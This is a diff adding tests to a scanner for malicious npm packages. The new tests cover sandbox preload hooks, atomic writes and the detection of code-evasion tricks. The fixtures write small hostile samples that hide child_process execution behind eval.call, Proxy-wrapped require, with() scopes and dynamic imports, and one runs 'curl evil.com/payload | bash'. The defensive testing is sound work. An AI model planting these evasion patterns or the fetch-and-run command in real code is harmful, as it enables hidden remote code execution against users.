@@ -464,6 +464,203 @@ fs.writeFileSync(wfPath, 'malicious workflow content');
 }
 
 // ===================================================================
+// CRITICAL #10: Native addon detection + /proc/uptime spoofing
+// ===================================================================
+async function runCritical10Tests() {
+  console.log('\n=== CRITICAL #10: Native addon detection + /proc/uptime spoofing ===\n');
+
+  test('C10: preload.js intercepts process.dlopen', () => {
+    const preloadSrc = fs.readFileSync(path.join(__dirname, '../../docker/preload.js'), 'utf8');
+    assert(preloadSrc.includes('process.dlopen'), 'Should patch process.dlopen');
+    assert(preloadSrc.includes('NATIVE_ADDON'), 'Should log NATIVE_ADDON category');
+  });
+
+  test('C10: preload.js intercepts /proc/uptime reads', () => {
+    const preloadSrc = fs.readFileSync(path.join(__dirname, '../../docker/preload.js'), 'utf8');
+    assert(preloadSrc.includes('/proc/uptime'), 'Should handle /proc/uptime reads');
+    assert(preloadSrc.includes('SPOOFED'), 'Should log spoofed uptime');
+  });
+
+  test('C10: analyzer.js handles NATIVE_ADDON log lines', () => {
+    const { analyzePreloadLog } = require('../../src/sandbox/analyzer.js');
+    const log = '[PRELOAD] NATIVE_ADDON: process.dlopen: /sandbox/install/node_modules/sharp/build/Release/sharp-linux-x64.node (t+150ms)\n';
+    const result = analyzePreloadLog(log);
+    assert(result.score > 0, 'Should score native addon loading');
+    const finding = result.findings.find(f => f.type === 'sandbox_native_addon_load');
+    assert(finding, 'Should produce sandbox_native_addon_load finding');
+    assert(finding.severity === 'MEDIUM', 'Native addon finding should be MEDIUM');
+  });
+
+  test('C10: analyzer.js ignores empty NATIVE_ADDON lines', () => {
+    const { analyzePreloadLog } = require('../../src/sandbox/analyzer.js');
+    const log = '[PRELOAD] INIT: Preload active. TIME_OFFSET=0ms (0.0h). PID=1\n';
+    const result = analyzePreloadLog(log);
+    const finding = result.findings.find(f => f.type === 'sandbox_native_addon_load');
+    assert(!finding, 'Should not produce finding without NATIVE_ADDON lines');
+  });
+}
+
+// ===================================================================
+// CRITICAL #15: Atomic writes in monitor.js
+// ===================================================================
+async function runCritical15Tests() {
+  console.log('\n=== CRITICAL #15: Atomic writes in monitor.js ===\n');
+
+  test('C15: atomicWriteFileSync exported from monitor', () => {
+    const { atomicWriteFileSync } = require('../../src/monitor.js');
+    assert(typeof atomicWriteFileSync === 'function', 'Should export atomicWriteFileSync');
+  });
+
+  test('C15: atomicWriteFileSync writes and renames correctly', () => {
+    const { atomicWriteFileSync } = require('../../src/monitor.js');
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c15-'));
+    try {
+      const target = path.join(tmpDir, 'test-atomic.json');
+      const data = JSON.stringify({ test: true, ts: Date.now() });
+      atomicWriteFileSync(target, data);
+      assert(fs.existsSync(target), 'Target file should exist');
+      assert(!fs.existsSync(target + '.tmp'), 'Temp file should be removed after rename');
+      const read = fs.readFileSync(target, 'utf8');
+      assert(read === data, 'Written data should match');
+    } finally {
+      fs.rmSync(tmpDir, { recursive: true, force: true });
+    }
+  });
+
+  test('C15: atomicWriteFileSync creates parent directory', () => {
+    const { atomicWriteFileSync } = require('../../src/monitor.js');
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c15b-'));
+    try {
+      const target = path.join(tmpDir, 'nested', 'dir', 'test.json');
+      atomicWriteFileSync(target, '{"ok":true}');
+      assert(fs.existsSync(target), 'Should create nested directories and write file');
+    } finally {
+      fs.rmSync(tmpDir, { recursive: true, force: true });
+    }
+  });
+
+  test('C15: monitor.js uses atomic writes for data files', () => {
+    const monitorSrc = fs.readFileSync(path.join(__dirname, '../../src/monitor.js'), 'utf8');
+    // Count non-atomic writeFileSync calls (exclude the atomicWriteFileSync definition and STATE_FILE)
+    const nonAtomicWrites = monitorSrc.match(/fs\.writeFileSync\([A-Z_]+FILE/g) || [];
+    assert(nonAtomicWrites.length === 0,
+      'All data file writes should use atomicWriteFileSync, found: ' + nonAtomicWrites.length + ' non-atomic writes');
+  });
+}
+
+// ===================================================================
+// CRITICAL #18: AST bypass techniques
+// ===================================================================
+async function runCritical18Tests() {
+  console.log('\n=== CRITICAL #18: AST bypass techniques ===\n');
+
+  await asyncTest('C18: Detects eval.call(null, code)', async () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c18a-'));
+    try {
+      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"c18a","version":"1.0.0"}');
+      fs.writeFileSync(path.join(tmpDir, 'evil.js'),
+        'var code = "process.exit(1)";\neval.call(null, code);\n');
+      const result = await runScanDirect(tmpDir);
+      const threat = result.threats.find(t => t.type === 'dangerous_call_eval' && t.message.includes('call'));
+      assert(threat, 'Should detect eval.call()');
+    } finally {
+      fs.rmSync(tmpDir, { recursive: true, force: true });
+    }
+  });
+
+  await asyncTest('C18: Detects [require][0]("child_process")', async () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c18b-'));
+    try {
+      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"c18b","version":"1.0.0"}');
+      fs.writeFileSync(path.join(tmpDir, 'evil.js'),
+        'var cp = [require][0]("child_process");\ncp.execSync("whoami");\n');
+      const result = await runScanDirect(tmpDir);
+      const threat = result.threats.find(t =>
+        t.type === 'dynamic_require' && t.message.includes('array access'));
+      assert(threat, 'Should detect [require][0]() array access evasion');
+    } finally {
+      fs.rmSync(tmpDir, { recursive: true, force: true });
+    }
+  });
+
+  await asyncTest('C18: Detects obj.exec = require("child_process").exec', async () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c18c-'));
+    try {
+      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"c18c","version":"1.0.0"}');
+      fs.writeFileSync(path.join(tmpDir, 'evil.js'),
+        'var obj = {};\nobj.run = require("child_process").exec;\nobj.run("whoami");\n');
+      const result = await runScanDirect(tmpDir);
+      const threat = result.threats.find(t =>
+        t.message.includes('Object property indirection') || t.message.includes('hiding exec'));
+      assert(threat, 'Should detect object property indirection for exec');
+    } finally {
+      fs.rmSync(tmpDir, { recursive: true, force: true });
+    }
+  });
+
+  await asyncTest('C18: Detects new Proxy(require, handler)', async () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c18d-'));
+    try {
+      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"c18d","version":"1.0.0"}');
+      fs.writeFileSync(path.join(tmpDir, 'evil.js'),
+        'var r = new Proxy(require, { apply: function(t, c, a) { return t.apply(c, a); } });\nr("child_process").execSync("id");\n');
+      const result = await runScanDirect(tmpDir);
+      const threat = result.threats.find(t =>
+        t.type === 'dynamic_require' && t.message.includes('Proxy'));
+      assert(threat, 'Should detect new Proxy(require)');
+    } finally {
+      fs.rmSync(tmpDir, { recursive: true, force: true });
+    }
+  });
+
+  await asyncTest('C18: Detects with(require("child_process")) exec(cmd)', async () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c18e-'));
+    try {
+      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"c18e","version":"1.0.0"}');
+      // with() only works in non-strict mode (sloppy mode scripts)
+      fs.writeFileSync(path.join(tmpDir, 'evil.js'),
+        'with(require("child_process")) { execSync("whoami"); }\n');
+      const result = await runScanDirect(tmpDir);
+      const threat = result.threats.find(t =>
+        t.type === 'dangerous_exec' && t.message.includes('with('));
+      assert(threat, 'Should detect with(require()) scope injection');
+    } finally {
+      fs.rmSync(tmpDir, { recursive: true, force: true });
+    }
+  });
+
+  await asyncTest('C18: Detects template literal in execSync', async () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c18f-'));
+    try {
+      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"c18f","version":"1.0.0"}');
+      fs.writeFileSync(path.join(tmpDir, 'evil.js'),
+        'const { execSync } = require("child_process");\nvar host = "evil.com";\nexecSync(`curl ${host}/payload | bash`);\n');
+      const result = await runScanDirect(tmpDir);
+      const threat = result.threats.find(t =>
+        t.type === 'dangerous_exec');
+      assert(threat, 'Should detect dangerous command in template literal exec');
+    } finally {
+      fs.rmSync(tmpDir, { recursive: true, force: true });
+    }
+  });
+
+  await asyncTest('C18: Detects import("child_process") dynamic import', async () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c18g-'));
+    try {
+      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"c18g","version":"1.0.0"}');
+      fs.writeFileSync(path.join(tmpDir, 'evil.mjs'),
+        'const cp = await import("child_process");\ncp.execSync("id");\n');
+      const result = await runScanDirect(tmpDir);
+      const threat = result.threats.find(t =>
+        t.type === 'dynamic_import' && t.message.includes('child_process'));
+      assert(threat, 'Should detect dynamic import of child_process');
+    } finally {
+      fs.rmSync(tmpDir, { recursive: true, force: true });
+    }
+  });
+}
+
+// ===================================================================
 // EXPORT
 // ===================================================================
 async function runAuditFixTests() {
@@ -477,6 +674,9 @@ async function runAuditFixTests() {
   await runAuditFix8Tests();
   await runAuditFix9Tests();
   await runAuditFix10Tests();
+  await runCritical10Tests();
+  await runCritical15Tests();
+  await runCritical18Tests();
 }
 
 module.exports = { runAuditFixTests };
